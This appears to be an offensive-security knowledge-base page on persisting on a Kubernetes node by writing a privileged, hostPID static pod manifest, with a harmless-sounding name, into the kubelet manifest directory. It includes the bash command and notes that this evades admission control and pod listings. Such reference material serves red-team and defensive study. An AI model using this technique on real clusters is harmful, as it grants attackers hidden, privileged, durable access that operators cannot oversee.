---
title: "Static pods: node-level pods the API server never sees"
description: "Persisting on a Kubernetes node by dropping a static pod manifest in the kubelet's manifest directory, so the kubelet runs the pod directly, outside the API server's control and invisible to cluster-wide pod listings and admission control."
keywords:
  - static pod
  - kubelet manifest
  - manifest directory
  - node persistence
  - kubernetes
---

# Static pods

The kubelet runs static pods from manifests in a local directory (commonly `/etc/kubernetes/manifests`), independent of the API server. Dropping a manifest there, after a node foothold, runs an attacker pod that admission control never evaluates and that does not appear in ordinary API-driven pod listings, only as a mirror pod on that node.

```bash
# On the node, with write to the kubelet manifest directory
cat > /etc/kubernetes/manifests/kube-reboot.yaml <<'YAML'
apiVersion: v1
kind: Pod
metadata: { name: kube-reboot }
spec:
  hostPID: true
  containers: [{ name: c, image: alpine, securityContext: { privileged: true }, command: ["sleep","inf"] }]
YAML
```

## Exploitation notes

- Static pods bypass Pod Security admission entirely, so a privileged static pod runs even on a hardened cluster, as long as you can write the manifest.
- They need a node foothold (the manifest directory is on the node), which an earlier [Pod escape to node](../pod-escape-to-node/index.md) provides.
- The kubelet recreates the pod from the manifest after restarts, making it durable per node.

## References

- [Kubernetes: static pods](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)
- [Kubernetes: Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
